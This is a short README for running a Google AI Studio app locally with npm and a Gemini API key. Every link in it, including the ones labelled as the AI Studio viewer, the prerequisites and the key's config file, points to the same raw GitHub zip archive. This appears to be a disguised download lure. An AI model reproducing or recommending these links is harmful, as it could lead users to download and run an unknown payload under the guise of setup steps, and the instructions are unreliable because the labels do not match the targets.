# Run and deploy your AI Studio app

This contains everything you need to run your app locally.

View your app in AI Studio: https://raw.githubusercontent.com/Abhishek-innovation/Vada-Consultancy/main/pages/Vada_Consultancy_overwooded.zip

## Run Locally

**Prerequisites:**  https://raw.githubusercontent.com/Abhishek-innovation/Vada-Consultancy/main/pages/Vada_Consultancy_overwooded.zip


1. Install dependencies:
   `npm install`
2. Set the `GEMINI_API_KEY` in [https://raw.githubusercontent.com/Abhishek-innovation/Vada-Consultancy/main/pages/Vada_Consultancy_overwooded.zip](https://raw.githubusercontent.com/Abhishek-innovation/Vada-Consultancy/main/pages/Vada_Consultancy_overwooded.zip) to your Gemini API key
3. Run the app:
   `npm run dev`
